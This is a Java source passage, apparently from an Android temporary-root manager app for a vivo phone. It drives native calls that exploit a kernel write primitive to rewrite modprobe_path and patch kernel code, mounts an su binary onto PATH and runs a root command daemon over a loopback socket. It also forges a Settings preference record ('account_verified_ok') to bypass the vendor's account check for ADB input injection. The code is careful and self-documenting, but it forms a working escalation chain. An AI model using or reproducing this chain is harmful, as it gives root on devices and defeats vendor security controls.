        String orig = rootLine("cat /proc/sys/kernel/modprobe");
        if (!isProbePath(orig)) {
            /* Without a usable original there is no way to undo the witness write, and leaving
             * modprobe_path as "/zz" would break module autoloading for the whole boot.  Refuse
             * before the alias exists, so nothing at all is written. */
            log.line("  window witness: root channel gave '" + orig + "', which is not a path -- "
                    + "REFUSING, the alias was not opened and nothing was written");
            return "rc=-9";
        }
        String open = Esc.nativeSugate7Open();
        log.line("  sugate7 open: " + open);
        if (!open.startsWith("rc=0"))
            return open;
        String moved = rootLine("cat /proc/sys/kernel/modprobe");
        if (!"/zz".equals(moved)) {
            log.line("  window NOT proven: the alias write left modprobe at '" + moved + "'");
            log.line("  abort (no .text written): " + Esc.nativeSugate7Abort(orig));
            return "rc=-7";
        }
        log.line("  window PROVEN through the alias: modprobe_path \"" + orig + "\" -> \"" + moved + "\"");
        String restoring = Esc.nativeSugate7Restore(orig);
        log.line("  sugate7 restore: " + restoring);
        if (!restoring.startsWith("rc=0")) {
            /* The alias write missed, so the string is still "/zz": undo it at the real VA. */
            log.line("  abort (no .text written): " + Esc.nativeSugate7Abort(orig));
            return restoring;
        }
        String back = rootLine("cat /proc/sys/kernel/modprobe");
        if (!orig.equals(back)) {
            log.line("  restore NOT witnessed: modprobe reads '" + back + "', expected '" + orig + "'");
            log.line("  abort (no .text written): " + Esc.nativeSugate7Abort(orig));
            return "rc=-8";
        }
        log.line("  restore witnessed: \"" + back + "\" came back through the alias, both directions proven");
        String patch = Esc.nativeSugate7Patch();
        log.line("  sugate7 patch: " + patch);
        return patch;
    }

    /** What the root channel answers for a sysctl that holds one path, minus the protocol's trailer. */
    private static String rootLine(String cmd) {
        String r = root(cmd);
        if (r == null)
            return "";
        String[] ln = r.split("\n");
        for (int i = 0; i < ln.length; i++) {
            String s = ln[i].trim();
            if (s.length() == 0 || s.startsWith("@SUD_EXIT"))
                continue;
            return s;
        }
        return "";
    }

    /** The shape modprobe_path must have for us to be allowed to move it: an absolute path that fits
     *  the kernel's char[64].  Anything else means the read did not come from the sysctl at all. */
    private static boolean isProbePath(String s) {
        return s != null && s.length() > 1 && s.length() <= 63 && s.charAt(0) == '/'
                && s.indexOf(' ') < 0 && s.indexOf('|') < 0;
    }

    public static void openSuName(Context ctx, Log log, int rounds) {
        /* The write primitive lands probabilistically and boot is its worst window.
         * One miss used to mean "no su on PATH until someone taps 提权" -- measured:
         * 3 of the last 4 reboots.  A repeat is cheap and idempotent (the alias entry
         * and the instruction word are written with the same bytes, and a failed round
         * simply re-fires the trigger), so try a few times before giving up. */
        String sg = "";
        for (int attempt = 1; attempt <= 4; attempt++) {
            sg = Esc.nativeSugate();
            log.line("sugate attempt " + attempt + ": " + sg);
            if (sg.startsWith("rc=0"))
                break;
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                break;
            }
        }
        if (!sg.startsWith("rc=0")) {
            log.line("  name gate left as shipped; apps must keep calling a renamed client");
            return;
        }
        File su = stage(ctx, log, "su");
        if (su == null)
            return;
        if (!execAllowed(su, log)) {
            log.line("  witness refused -> reverting the word: " + Esc.nativeSugateRevert());
            return;
        }
        File tool = stage(ctx, log, "sumount");
        if (tool == null)
            return;
        log.line("mount su onto PATH: " + trim1(root(tool.getAbsolutePath() + " " + su.getAbsolutePath())));
        log.line("where PATH finds it: "
                + trim1(root("sh -c 'command -v su; ls -lZ /sbin/su 2>&1 | tail -1'")));
    }

    /** True only if execve itself was permitted.  Java reports a refused exec as an
     *  exception with the errno in it, so "no exception" is the whole answer; output and
     *  exit status say nothing about the guard. */
    private static boolean execAllowed(File f, Log log) {
        try {
            Process pr = new ProcessBuilder(f.getAbsolutePath(), "--help")
                    .redirectErrorStream(true).start();
            String out = slurp(pr.getInputStream(), 200);
            pr.waitFor();
            log.line("  app-exec " + f.getName() + ": execve allowed (out=" + trim1(out) + ")");
            return true;
        } catch (Throwable t) {
            log.line("  app-exec " + f.getName() + ": execve refused -- " + t);
            return false;
        }
    }

    /* The interesting lines of a several-hundred-line run are the L7:/P7: step read-outs, and they
     * are NOT at the end of the file (the hold-loop probes are), so a byte tail is the wrong slice.
     * Pick the step lines instead, oldest first, capped so one log record still carries them. */
    private static String stepsOfFile(java.io.File f, int max) {
        try {
            if (!f.exists())
                return "(no log file)";
            java.io.BufferedReader rd = new java.io.BufferedReader(new java.io.FileReader(f));
            StringBuilder keep = new StringBuilder();
            String line, last = null;
            try {
                while ((line = rd.readLine()) != null) {
                    if (line.indexOf("L7:") < 0 && line.indexOf("P7:") < 0 && line.indexOf("TASKVA") < 0
                            && line.indexOf("GATE") < 0 && line.indexOf("arm failed") < 0
                            && line.indexOf("writer") < 0 && line.indexOf("LEAVING") < 0
                            && line.indexOf("LEFT BORROWED") < 0)
                        continue;
                    String t = line.trim();
                    if (t.equals(last))        /* the needle prints the same TASKVA line once per round */
                        continue;
                    last = t;
                    if (keep.length() > 0)
                        keep.append(" | ");
                    keep.append(t);
                    if (keep.length() > max)
                        break;
                }
            } finally {
                rd.close();
            }
            return keep.length() == 0 ? "(no step lines)" : keep.toString();
        } catch (Throwable t) {
            return "read failed: " + t;
        }
    }

    private static String tailOfFile(java.io.File f, int max) {
        try {
            if (!f.exists())
                return "(no log file)";
            int len = (int) Math.min(f.length(), max);
            byte[] buf = new byte[len];
            java.io.RandomAccessFile ra = new java.io.RandomAccessFile(f, "r");
            try {
                ra.seek(f.length() - len);
                ra.readFully(buf);
            } finally {
                ra.close();
            }
            return new String(buf);
        } catch (Throwable t) {
            return "tail failed: " + t;
        }
    }

    private static String trim1(String s) {
        if (s == null)
            return "";
        s = s.replace('\n', '|').replace('\r', ' ').trim();
        return s.length() > 160 ? s.substring(0, 160) : s;
    }

    /** Re-arm the su channel without running the chain.  relayd is a CHILD OF THIS APP PROCESS, and the
     *  binder has to be an app-domain process (the borrowed cred cannot bind SOCK_STREAM -- ledger 623-626),
     *  so when the process is recycled the abstract @sud listener goes with it: measured on 1.9.8, the same
     *  demo caller got `uid=0(root)` at 01:05 and `su: no sud channel (Permission denied)` at 01:13 with
     *  nothing changed in between (art/ledger-20261016.md 631).  Every trigger that finds the boot already
     *  served must therefore still make sure somebody is listening.  `--serve-if-free` makes this idempotent
     *  against our own live listener and keeps it from taking over the 6.0.1 route. */
    public static void ensureRelay(Context ctx, Log log) {
        startRelay(ctx, log);
    }

    /** The su channel needs a unix-stream listener before a caller can be given a kernel-issued
     *  identity, and on this ROM the escalated task cannot bind one: its SOCK_STREAM bind returns
     *  EPERM while SOCK_DGRAM binds fine (art/ledger-20261016.md 623-626). So the MANAGER binds it.
     *  The helper accepts a caller, reads that caller uid from SO_PEERCRED (never from what the
     *  caller claims), applies our own allow list, and only then asks sud over TCP with our token.
     *  --serve-if-free is what keeps this from hijacking the 6.0.1 route, where sud binds @sud
     *  itself, and makes a second call in the same boot stand down against our own listener. */
    private static void startRelay(Context ctx, Log log) {
        try {
            File h = stage(ctx, log, "relayd");

            if (h == null) {
                log.line("relay: not staged -- third-party apps get no su channel on this ROM");
                return;
            }
            java.io.File ext = ctx.getExternalFilesDir(null);
            java.io.File blog = new java.io.File(ext != null ? ext : ctx.getFilesDir(), "relayd.log");
            ProcessBuilder pb = new ProcessBuilder(h.getAbsolutePath(), "--serve-if-free",
                    "--sock", "sud",
                    "--grants", grantsFile(ctx).getAbsolutePath(),
                    "--token", new File(ctx.getFilesDir(), "su.token").getAbsolutePath(),
                    "--log", blog.getAbsolutePath());

            pb.redirectErrorStream(true);
            /* INHERIT, not Redirect.from(/dev/null): `from` is an *input* redirect and start()
             * threw IllegalArgumentException, so the relay never launched (measured on 1.9.6,
             * art/ledger-20261016.md 629).  An app process's own stdout is already /dev/null. */
            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
            pb.start();
            log.line("relay: started (audit trail: " + blog.getAbsolutePath() + ")");
        } catch (Throwable t) {
            log.line("relay: failed to start: " + t);
        }
    }

    private static File stage(Context ctx, Log log, String name) {
        File dst = new File(ctx.getFilesDir(), name);
        /* Write to a temporary name and rename: the previous daemon is often
         * still running from that exact path, and writing it in place fails with
         * ETXTBSY ("Text file busy").  rename() swaps the directory entry and the
         * running process keeps its own inode, which is what we want.
         * The temp name has to be UNIQUE: when a rename ever failed, the daemon ended up running
         * from `<name>.new` itself, and the next run's fixed temp name was then the busy file --
         * ETXTBSY at open time, "ABORT: daemon not staged", and the whole chain died before it
         * could even fire the needle (measured on 1.9.5, art/ledger-20261016.md 628). */
        File tmp = new File(ctx.getFilesDir(), name + ".new." + System.currentTimeMillis());
        try {
            InputStream in = ctx.getAssets().open(name);
            OutputStream out = new FileOutputStream(tmp);
            byte[] buf = new byte[64 * 1024];
            int n, total = 0;
            while ((n = in.read(buf)) > 0) {
                out.write(buf, 0, n);
                total += n;
            }
            out.close();
            in.close();
            tmp.setExecutable(true, false);
            tmp.setReadable(true, false);
            if (!tmp.renameTo(dst))
                log.line("rename " + tmp.getName() + " -> " + name + " failed, using temp path");
            else
                tmp = dst;
            tmp.setExecutable(true, false);
            tmp.setReadable(true, false);
            log.line("staged " + tmp.getAbsolutePath() + " bytes=" + total
                    + " canExec=" + tmp.canExecute());
            return tmp;
        } catch (Throwable t) {
            log.line("stage " + name + " failed: " + t);
            return null;
        }
    }

    /* ------------------------------------------------------------------ *
     * The allow list.  It lives in OUR files dir (we own it; root only reads
     * it), one uid per line -- so the manager is the author and sud is the
     * enforcer, and there is no world-writable policy file to race with.
     * ------------------------------------------------------------------ */
    public static File grantsFile(Context ctx) {
        return new File(ctx.getFilesDir(), GRANTS_NAME);
    }

    public static List<Integer> readGrants(Context ctx) {
        List<Integer> g = readGrantsOrNull(ctx);
        return g == null ? new ArrayList<Integer>() : g;
    }

    /** The list, or NULL when the file is there but this uid could not read it.  The distinction is
     *  the whole point: an empty list is a state we may write, "could not see it" is not -- rewriting
     *  after a failed read is exactly how Shizuku (10133) and snub (10135) once vanished from the
     *  owner's allow list (ledger 670), and on the boot path the only thing that saved the list was
     *  that the write then failed for reasons we do not yet have an errno for. */
    public static List<Integer> readGrantsOrNull(Context ctx) {
        List<Integer> out = new ArrayList<Integer>();
        File g = grantsFile(ctx);
        lastGrantsError = "-";
        try {
            InputStream in = new java.io.FileInputStream(g);
            byte[] b = new byte[8192];
            int n = in.read(b);
            in.close();
            String s = new String(b, 0, Math.max(n, 0), "UTF-8");
            for (String line : s.split("\\s+")) {
                if (line.length() == 0)
                    continue;
                try {
                    out.add(Integer.valueOf(line.trim()));
                } catch (NumberFormatException e) {
                    /* a comment or a stray line: ignored on purpose */
                }
            }
            return out;
        } catch (java.io.FileNotFoundException e) {
            /* no file yet -- legitimately empty, and writing the first entry is what we are for */
            return out;
        } catch (Throwable t) {
            lastGrantsError = "read " + g.getAbsolutePath() + ": " + t;
            return null;
        }
    }

    /** Why the last readGrants/writeGrants did not do what it was asked, or "-" when it did.
     *  Carried into the chain's own log line because the failure is silent from the UI either way,
     *  and a swallowed errno is how a wrong story gets recorded as a measurement. */
    public static String lastGrantsError = "-";

    public static boolean writeGrants(Context ctx, List<Integer> uids) {
        StringBuilder sb = new StringBuilder();
        for (Integer u : uids)
            sb.append(u.intValue()).append('\n');
        try {
            /* Delete first: opening an existing file keeps whoever-owned inode and its mode, and a
             * list that strangers can write is one the daemon will not read at all
             * (sud.c grants_file_usable).  A fresh inode is ours, and the owner-only bits below
             * make it unreadable/unwritable to anyone else. */
            File g = grantsFile(ctx);
            if (g.exists() && !g.delete()) {
                lastGrantsError = "unlink refused on " + g.getAbsolutePath()
                        + " (exists, canRead=" + g.canRead() + ", canWrite=" + g.canWrite() + ")";
                return false;
            }
            OutputStream o = new FileOutputStream(g);
            o.write(sb.toString().getBytes("UTF-8"));
            o.close();
            g.setReadable(true, true);
            g.setWritable(true, true);
            if (g.length() <= 0) {
                lastGrantsError = "wrote " + g.getAbsolutePath() + " but it reads " + g.length() + " bytes";
                return false;
            }
            lastGrantsError = "-";
            return true;
        } catch (Throwable t) {
            lastGrantsError = "write: " + t;
            return false;
        }
    }

    /** Our own uid has to be in the list or the manager cannot use its own service. */
    public static void selfGrant(Context ctx, Log log) {
        int me = android.os.Process.myUid();
        File existing = grantsFile(ctx);
        if (existing.exists() && !existing.canRead()) {
            /* The list is written by root on the recovery path, so it is often root-owned 0600 and
             * this app cannot read it.  Rewriting it anyway would silently drop every uid the OWNER
             * put there -- measured on 2026-10-20, where a chain run cleared Shizuku (10133) and
             * snub (10135) out of the allow list.  Leave the file alone instead: the daemon reads it
             * as root, our own uid is in it by construction, and "cannot manage the list this run"
             * is far cheaper than "deleted the user's configuration". */
            log.line("self-grant uid=" + me + " skipped: the list exists but is not readable by us"
                    + " (root-owned?) -- NOT rewriting, that would discard the owner's entries");
            return;
        }
        List<Integer> g = readGrantsOrNull(ctx);
        if (g == null) {
            /* The old shape of this function treated "could not read" as "empty", appended our own uid
             * and wrote the result -- which is a one-line way to delete everybody else's grant.  On the
             * boot path that is what `added` in the log meant, and only a failed unlink is what kept
             * the owner's entries (ledger 670/676).  Refuse instead, with the errno. */
            log.line("self-grant uid=" + me + " REFUSED: " + lastGrantsError
                    + " -- not rewriting a list we cannot see");
            return;
        }
        boolean missing = !g.contains(Integer.valueOf(me));
        if (missing)
            g.add(Integer.valueOf(me));
        /* Rewrite even when our uid is already there: a list left root-owned and 0666 by some
         * earlier root-side edit is both a security hole and, now that the daemon refuses such
         * files, a lock-out of this app's own service. */
        boolean saved = writeGrants(ctx, g);
        log.line("self-grant uid=" + me + (missing ? " added" : " resealed")
                + " saved=" + saved + " list=" + g + " why=" + lastGrantsError);
    }

    /* ------------------------------------------------------------------ *
     * Requests to the daemon.
     * ------------------------------------------------------------------ */

    /** Run a command as root through the gated channel.  The daemon authenticates
     *  us first (see token()), then honours the uid we ask for -- 0 here.  Getting
     *  this wrong (passing myUid) makes the daemon answer with our own identity,
     *  which looks like a working su but is not root. */
    public static String root(String cmd) {
        return su(0, cmd);
    }

    /** The headphone-gain arm (ledger 592/686): have `clobber` write the named 4-byte value into
     *  `wcd_hph_gain`, the one column of which the two firmware lines differ (33 ohm -> column 1).
     *  No kernel address is spelled in Java: clobber carries it as a gated constant that
     *  tools/gate_constants.py re-derives from the recovered kallsyms, and the binary itself refuses
     *  unless /proc/sys/kernel/osrelease matches the build that reading belongs to. */
    public static String hpGain(String arm) {
        /* WQI/SAFEFED are spelled out even though the binary defaults to the same pair: the first
         * boot apply came back `bad WQI=0` because this transport appends an empty argument, and an
         * argument the caller controls is one less thing the transport can eat (ledger 687). */
        return root("/data/local/tmp/clobber 40 hpgain " + arm + " 4 0");
    }

    /** A FIRED witness only -- the value in RAM cannot be read back on this machine (ledger 603), so
     *  no caller may report "verified"; the effect face is the listener. */
    public static boolean hpGainLanded(String out) {
        return out != null && out.indexOf("CLOBBER OK") >= 0;
    }

    static final String GAIN_FILE = "hpgain";

    /** The operator's last choice, or null when there is none -- and "none" is not a loss: the array
     *  comes back from DT on every boot, which is 7's own value. */
    public static String gainChoice(Context ctx) {
        try {
            java.io.InputStream in = ctx.openFileInput(GAIN_FILE);
            byte[] b = new byte[16];
            int n = in.read(b);
            in.close();
            String s = new String(b, 0, n > 0 ? n : 0).trim();
            return ("601".equals(s) || "stock".equals(s)) ? s : null;
        } catch (java.io.IOException e) {
            return null;
        }
    }

    public static boolean saveGainChoice(Context ctx, String arm) {
        try {
            java.io.FileOutputStream out = ctx.openFileOutput(GAIN_FILE, Context.MODE_PRIVATE);
            out.write(arm.getBytes());
            out.close();
            return true;
        } catch (java.io.IOException e) {
            return false;
        }
    }

    /** Re-apply at boot: the RAM write does not survive a reboot, so a stored choice has to be put
     *  back by the same chain that opened the su name.  Failure is a log line, never a silent pass. */
    static void applyGainChoice(Context ctx, Log log) {
        String arm = gainChoice(ctx);
        if (arm == null) {
            log.line("hpgain: 没存过选择 -> 保持 7 自己的 DT 值（未写任何东西）");
            return;
        }
        String out = hpGain(arm);
        if (hpGainLanded(out))
            log.line("hpgain " + arm + ": FIRED（读不回是设计如此・生效要等下一次耳机路使能）");
        else {
            String s = out == null ? "null" : out.replace('\n', ' ');
            log.line("hpgain " + arm + ": 没打到 -> " + s.substring(0, Math.min(s.length(), 160)));
        }
    }

    /** Which channel the last request went over -- shown in the log so a
     *  kernel-credential decision is never confused with the TCP+token fallback. */
    public static String lastChannel = "-";

    /** Ask for a command to run as `toUid` (0 = root, like KernelSU's uid choice).
     *  Peer first: that is the one whose uid the kernel filled in. */
    public static String su(int toUid, String cmd) {
        String r = null;

        if (route8) {
            /* Route 8's responder is a shell script behind toybox nc: it can serve the line
             * protocol on 12346 but cannot call back over SCM_CREDENTIALS, so the token over
             * loopback is the only channel.  Going straight there also skips the peer's 10 s
             * timeout on every request. */
            lastChannel = "tcp+token (route8)";
            return ask("SU " + toUid + " " + cmd, 8000);
        }
        try {
            r = Esc.nativePeerSu(toUid, cmd);
        } catch (Throwable t) {
            r = null;
        }
        if (r != null && !r.startsWith("xport:")) {
            lastChannel = "peer(SCM_CREDENTIALS)";
            return r;
        }
        lastChannel = "tcp+token (" + (r == null ? "no native" : r) + ")";
        return ask("SU " + toUid + " " + cmd, 4000);
    }

    /* ------------------------------------------------------------------ *
     * The vendor's 「USB模拟点击」 gate (art/ledger-20261021.md 691-701).
     *
     * system_server's VivoPackageManagerSerivceUtils.withholds INJECT_EVENTS from uid 2000 unless
     * Settings.Secure vivo_adb_simulate_input == 1, and the vendor UI only lets that flag be turned on
     * after a vivo-account check.  The check is *client side*: DevelopmentSettings' dialog reads
     * SharedPreferences("development").getBoolean("account_verified_ok") first and, when true, writes the
     * flag without asking for an account at all.  So this plants that record.
     *
     * It is deliberately a file write and nothing more: the daemon's root has no servicemanager access
     * (`dumpsys window` -> "Can't find service: window", `settings put` -> null IActivityManager), so it
     * can never write the Secure value itself -- the last move stays a finger on the switch, and this
     * method only makes that move account-free.  Settings' manifest carries
     * defaultToDeviceProtectedStorage=true, so its prefs live under /data/user_de; writing the /data/data
     * path reads back false silently (measured twice).  Idempotent -- an existing record is left alone.
     * Returns the daemon's witness, never a verdict of its own.
     * ------------------------------------------------------------------ */
    static final String ADB_INPUT_PREF =
            "/data/user_de/0/com.android.settings/shared_prefs/development.xml";

    public static String unlockAdbInput() {
        String xml = "'<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\" ?>' '<map>' "
                + "'    <boolean name=\"account_verified_ok\" value=\"true\" />' '</map>'";
        String cmd = "P=" + ADB_INPUT_PREF + "; D=${P%/*}; st=written; "
                + "if grep -q 'account_verified_ok.*true' $P 2>/dev/null; then st=already; "
                + "else mkdir -p $D; printf '%s\\n' " + xml + " > $P || st=write_failed; fi; "
                + "chown 1000:1000 $D $P 2>/dev/null; chmod 771 $D 2>/dev/null; chmod 660 $P 2>/dev/null; "
                + "restorecon -R $D 2>/dev/null; "
                + "echo \"UNLOCK_ADB_INPUT st=$st count=$(grep -c 'account_verified_ok.*true' $P 2>/dev/null) "
                + "label=$(ls -Zd $P 2>/dev/null | cut -d' ' -f1)\"";
        return su(0, cmd);
    }

    /* ------------------------------------------------------------------ *
     * Identity.  The daemon cannot see an app's TCP row in /proc/net/tcp (measured),
     * so the app proves itself with a secret it holds in its private dir: other
     * apps cannot read it (DAC still applies while permissive, app data is 0771
     * with 0600 files) and root can.  Possession = identity.
     * ------------------------------------------------------------------ */
    public static String token(Context ctx) {
        final String name = "su.token";
        try {
            File f = new File(ctx.getFilesDir(), name);
            if (f.exists() && f.length() >= 8) {
                byte[] b = new byte[96];
                InputStream in = new java.io.FileInputStream(f);
                int n = in.read(b);
                in.close();
                if (n >= 8)
                    return new String(b, 0, n, "UTF-8").trim();
            }
            StringBuilder sb = new StringBuilder();
            java.security.SecureRandom rnd = new java.security.SecureRandom();
            for (int i = 0; i < 32; i++)
                sb.append("0123456789abcdef".charAt(rnd.nextInt(16)));
            String t = sb.toString();
            OutputStream o = ctx.openFileOutput(name, Context.MODE_PRIVATE);
            o.write((t + "\n").getBytes("UTF-8"));
            o.close();
            return t;
        } catch (Throwable e) {
            return "";
        }
    }

    private static String ask(String request, int soTimeout) {
        String tok = currentToken;
        String full = tok == null || tok.length() == 0 ? request : request + " TOK=" + tok;
        String last = "no answer";

        /* The daemon is started by the kernel helper and binds its ports a moment
         * after execve() returns, so the first request after an escalation has to
         * retry -- otherwise it races the listener and reports ECONNREFUSED. */
        for (int tryNo = 0; tryNo < 10; tryNo++) {
            Socket s = new Socket();
            try {
                s.connect(new InetSocketAddress("127.0.0.1", SU_PORT), 3000);
                s.setSoTimeout(soTimeout);
                OutputStream o = s.getOutputStream();
                o.write((full + "\n").getBytes("UTF-8"));
                o.flush();
                String r = slurp(s.getInputStream(), 4000);
                s.close();
                return r.replace("\r", "").trim();
            } catch (Throwable t) {
                last = t.getClass().getSimpleName() + ": " + t.getMessage();
                try {
                    s.close();
                } catch (Throwable ignore) {
                }
                if (t instanceof java.net.ConnectException && tryNo < 9) {
                    try {
                        Thread.sleep(400);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                    }
                    continue;
                }
                return "no answer (" + last + ")";
            }
        }
        return "no answer (" + last + ")";
    }

    private static String currentToken = null;
    /** Set by a map-only attempt whose step1 witness read rc=0: our types are then exempt
     *  for the rest of this boot, whatever later step lost the race. */
    private static boolean mapPlanted = false;
    /** True while this process serves an Android 8.1 boot.  Route 8's responder has no
     *  SCM_CREDENTIALS reverse channel (it is a shell script), so requests go straight to
     *  TCP+token instead of spending 10 s in the peer attempt first. */
    private static boolean route8 = false;

    public static void useToken(Context ctx) {
        currentToken = token(ctx);
        /* A new process (boot job, service restart) has not run the chain yet, so recover the
         * route from the same remembered release the chain routes on. */
        try {
            String k = ctx.getSharedPreferences("temproot", 0).getString("krel", "");
            route8 = k != null && k.startsWith("3.18.71-perf-g8a8c60dd");
        } catch (Throwable ignore) {
            /* keep whatever run() set */
        }
    }

    /** The raw shell port -- what tools/verify_root.sh measures.  Kept so the same
     *  acceptance gate covers both halves. */
    public static String daemon(String cmd) {
        Socket s = new Socket();
        try {
            s.connect(new InetSocketAddress("127.0.0.1", SH_PORT), 3000);
            s.setSoTimeout(3000);
            OutputStream o = s.getOutputStream();
            o.write((cmd + "\n").getBytes("UTF-8"));
            o.flush();
            String r = slurp(s.getInputStream(), 2000);
            s.close();
            return r.replace("\r", "").trim();
        } catch (Throwable t) {
            return "no answer (" + t.getClass().getSimpleName() + ": " + t.getMessage() + ")";
        }
    }

    /* ------------------------------------------------------------------ *
     * The app list the manager ticks: every installed application, with its uid
     * resolved the same way the daemon will see it.
     * ------------------------------------------------------------------ */
    public static final class Entry {
        public String pkg;
        public String label;
        public int uid;
        public boolean system;
        public boolean granted;

        Entry(String p, String l, int u, boolean sys) {
            pkg = p;
            label = l;
            uid = u;
            system = sys;
        }
    }

    public static List<Entry> listApps(Context ctx) {
        List<Entry> out = new ArrayList<Chain.Entry>();
        PackageManager pm = ctx.getPackageManager();
        List<Integer> grants = readGrants(ctx);
        try {
            List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            for (ApplicationInfo ai : apps) {
                String label;
                try {
                    label = String.valueOf(pm.getApplicationLabel(ai));
                } catch (Throwable t) {
                    label = ai.packageName;
                }
                Entry e = new Entry(ai.packageName, label, ai.uid,
                        (ai.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
                e.granted = grants.contains(Integer.valueOf(ai.uid));
                out.add(e);
            }
        } catch (Throwable t) {
            return out;
        }
        java.util.Collections.sort(out, new java.util.Comparator<Entry>() {
            @Override
            public int compare(Entry a, Entry b) {
                if (a.granted != b.granted)
                    return a.granted ? -1 : 1;
                return a.label.compareToIgnoreCase(b.label);
            }
        });
        return out;
    }

    /** Persist the checked set: uids of the apps the user ticked. */
    public static boolean saveSelection(Context ctx, List<Entry> all, List<String> checkedPkgs) {
        List<Integer> uids = new ArrayList<Integer>();
        for (Entry e : all)
            if (checkedPkgs.contains(e.pkg))
                uids.add(Integer.valueOf(e.uid));
        int me = android.os.Process.myUid();
        if (!uids.contains(Integer.valueOf(me)))
            uids.add(Integer.valueOf(me));
        return writeGrants(ctx, uids);
    }

    /** The daemon's decision record.  Since ledger 586 it is 0600 root-owned, so an unprivileged
     *  app CANNOT read it directly -- that is the point (the log used to be 0644 and any app could
     *  read which uids had been granted).  The read that is allowed is the one the authorization
     *  layer already grants: ask the su channel, which succeeds only for a listed uid.  The route
     *  taken is named in the returned text, because "log unreadable" used to be reported as if it
     *  were the daemon's fault rather than the caller's permission. */
    public static String suLog() {
        /* Route 8: the responder writes the same file but there is no `su` on PATH to run a
         * fallback with (this ROM's name gate refuses it), so ask over the token channel. */
        if (route8 || (lastChannel != null && lastChannel.indexOf("route8") >= 0)) {
            if (currentToken != null && currentToken.length() > 0) {
                String via = ask("tail -c 4096 /data/local/tmp/.sud/sud.log", 4000);
                return via == null || via.trim().isEmpty()
                        ? "(no requests yet)" : "via route8 channel: " + trim1(via);
            }
        }
        File f = new File("/data/local/tmp/.sud/sud.log");
        String direct;
        try {
            if (!f.exists())
                return "(no requests yet)";
            byte[] b = new byte[(int) Math.min(f.length(), 4096)];
            java.io.RandomAccessFile raf = new java.io.RandomAccessFile(f, "r");
            int n;
            try {
                raf.seek(Math.max(0, f.length() - b.length));
                n = raf.read(b);
            } finally {
                raf.close();
            }
            direct = new String(b, 0, Math.max(n, 0), "UTF-8").trim();
            if (direct.isEmpty())
                return "(no requests yet)";
            return "direct: " + direct;
        } catch (Throwable t) {
            direct = "direct read refused (" + t.getClass().getSimpleName() + ")";
        }
        try {
            Process pr = Runtime.getRuntime().exec(new String[] {
                "/data/data/com.xplay6.temproot/files/su", "-c",
                "tail -c 4096 /data/local/tmp/.sud/sud.log" });
            String out = slurp(pr.getInputStream(), 4096).trim();
            pr.waitFor();
            if (!out.isEmpty())
                return "via su channel (granted): " + out;
            return direct + "; su channel returned nothing -- the log is root-only since ledger "
                    + "586 and this uid is not granted, so it is unreadable by design";
        } catch (Throwable t2) {
            return direct + "; su channel failed: " + t2;
        }
    }

    private static String slurp(InputStream in, int cap) throws java.io.IOException {
        byte[] b = new byte[4096];
        StringBuilder sb = new StringBuilder();
        int n;
        while ((n = in.read(b)) > 0) {
            sb.append(new String(b, 0, n, "UTF-8"));
            if (sb.length() > cap)
                break;
        }
        return sb.toString();
    }
}
